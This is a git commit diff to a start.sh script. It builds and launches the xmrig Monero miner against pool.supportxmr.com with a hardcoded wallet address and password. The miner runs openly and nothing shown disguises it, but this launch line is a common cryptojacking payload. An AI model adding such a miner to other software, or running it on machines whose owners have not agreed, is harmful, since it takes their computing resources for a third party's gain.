9112df93bc106722daeba5ad9684ad7b588af011
Abbas Bandar <abbasbandar@gmail.com>
2024-04-10 23:52:38 +0200

    add code

--- start.sh
+++ start.sh
@@ -1,3 +1,5 @@
-chmod +x *
+cd source && chmod +x *
 
-./xmrig -o pool.supportxmr.com:443 -u 4318tW8SFCr4UjksRM5hwRGXPUFVB4K1vUZXqUoQzdqaZ8DAojkpkQkZqNLZYbtv1nQ743YE8V3BtfMuhNfaxnhhQQ8Yiqx -k --tls -p tunning_advanced
+./install
+
+./build/xmrig -o pool.supportxmr.com:443 -u 4318tW8SFCr4UjksRM5hwRGXPUFVB4K1vUZXqUoQzdqaZ8DAojkpkQkZqNLZYbtv1nQ743YE8V3BtfMuhNfaxnhhQQ8Yiqx -k --tls -p tunning_advanced
